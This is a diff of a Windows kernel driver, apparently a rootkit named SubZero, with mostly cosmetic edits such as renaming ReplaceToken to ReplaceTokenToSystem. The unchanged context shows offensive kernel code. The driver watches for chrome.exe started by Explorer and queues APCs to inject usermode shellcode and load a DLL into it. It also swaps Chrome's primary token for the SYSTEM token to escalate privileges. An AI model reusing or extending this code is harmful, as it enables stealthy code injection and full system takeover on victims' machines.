@@ -9,9 +9,9 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPE
 void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
 void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
 void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize);
-bool FindProcessByName(CHAR* Name, PEPROCESS* Process);
+bool FindProcessByName(char* Name, PEPROCESS* Process);
 bool QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunction);
-void ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token);
+void ReplaceTokenToSystem(PEPROCESS Process, PACCESS_TOKEN Token);
 
 extern "C" NTSTATUS
 DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
@@ -115,11 +115,12 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 }
 
 void SubZeroUnload(PDRIVER_OBJECT DriverObject) {
-	// unregister Process & Thread notifications in case of an error
+	
+	// Unregister Process & Thread notifications in case of an error
 	::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
 	::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
 
-	// unregister object & registry notifications
+	// Unregister object & registry notifications
 	::ObUnRegisterCallbacks(g_Globals.ObjectRegistrationHandle);
 	::CmUnRegisterCallback(g_Globals.RegistryRegistrationCookie);
 
@@ -219,7 +220,7 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
 		// Check if the first Thread was already found
 		if (g_Globals.ChromeFirstThreadID != 0) return;
 
-		KdPrint((DRIVER_PREFIX "[+] chrome first Thread catched. TID: %d\n", tid));
+		KdPrint((DRIVER_PREFIX "[+] Chrome first Thread catched. TID: %d\n", tid));
 		g_Globals.ChromeFirstThreadID = tid;
 
 		// Queue APC for dll loading
@@ -232,9 +233,9 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
 					PEPROCESS Process;
 					PACCESS_TOKEN Token;
 				
-					Process = PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
+					Process = ::PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
 					Token = ::PsReferencePrimaryToken(Process); // Get the process token
-					ReplaceToken(Process, Token);				// Replace the process token with system token
+					ReplaceTokenToSystem(Process, Token);		// Replace the process token with system token
 					::ObDereferenceObject(Token);				// Dereference the process token
 					
 					// Thread and Process creation notification callbacks are not needed anymore
@@ -261,12 +262,11 @@ void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateI
 		if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) {
 			KdPrint((DRIVER_PREFIX "[+] Chrome.exe catched. PID: %d\n", pid));
 			g_Globals.ChromePID = pid;
-			return;
 		}
 	}
 }
 
-bool FindProcessByName(CHAR* Name, PEPROCESS* Process)
+bool FindProcessByName(char* Name, PEPROCESS* Process)
 {
 	PEPROCESS initialSystemProcess = PsInitialSystemProcess;
 	PEPROCESS currentEntry = initialSystemProcess;
@@ -286,8 +286,6 @@ bool FindProcessByName(CHAR* Name, PEPROCESS* Process)
 			if (activeThreads)
 			{
 				*Process = currentEntry;
-				//PLIST_ENTRY list = (PLIST_ENTRY)((uintptr_t)(currentEntry) + 0x488); // EPROCESS->ThreadListHead
-				//*Thread = (PKTHREAD)((uintptr_t)list->Flink - 0x6b8); // Same as CONTAINING_RECORD macro
 				return true;
 			}
 		}
@@ -434,7 +432,7 @@ void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize) 
 	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
 }
 
-void ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token)
+void ReplaceTokenToSystem(PEPROCESS Process, PACCESS_TOKEN Token)
 {
 	PACCESS_TOKEN SystemToken = ::PsReferencePrimaryToken(PsInitialSystemProcess);
 	PULONG_PTR ptr = (PULONG_PTR)Process;
